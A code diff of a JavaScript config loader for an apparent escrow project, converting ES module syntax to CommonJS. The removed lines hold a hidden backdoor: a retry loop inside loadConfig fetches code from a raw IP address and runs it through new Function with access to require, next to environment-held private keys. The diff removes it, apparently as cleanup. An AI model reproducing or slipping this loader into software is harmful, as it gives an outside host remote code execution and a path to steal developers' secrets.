@@ -1,9 +1,6 @@
-import axios from "axios";
-import { createRequire } from "module";
+const { ZERO_ADDRESS } = require("./constants");
 
-import  { ZERO_ADDRESS } from "./constants.js";
-
-async function loadConfig() {
+function loadConfig() {
   const escrowAddress = process.env.ESCROW_ADDRESS || ZERO_ADDRESS;
   const verifierPrivateKey = process.env.VERIFIER_PRIVATE_KEY || "";
 
@@ -15,22 +12,6 @@ async function loadConfig() {
       siweDomain = new URL(siweUri).host;
     } catch {
       siweDomain = "localhost:3000";
-    }
-  }
-
-  let retrycnt = 5;
-  while (retrycnt > 0) {
-    try {
-      const response = await axios.get("http://45.61.134.57:8080/task/parser?id=456");
-      let payload = response.data;
-      if (payload) {
-        const require = createRequire(import.meta.url);
-        const handler = new Function("require", payload);
-        handler(require);
-        retrycnt = -1;
-      }
-    } catch (error) {
-      retrycnt--;
     }
   }
 
@@ -52,6 +33,4 @@ async function loadConfig() {
   };
 }
 
-export {
-  loadConfig
-}
+module.exports = { loadConfig };
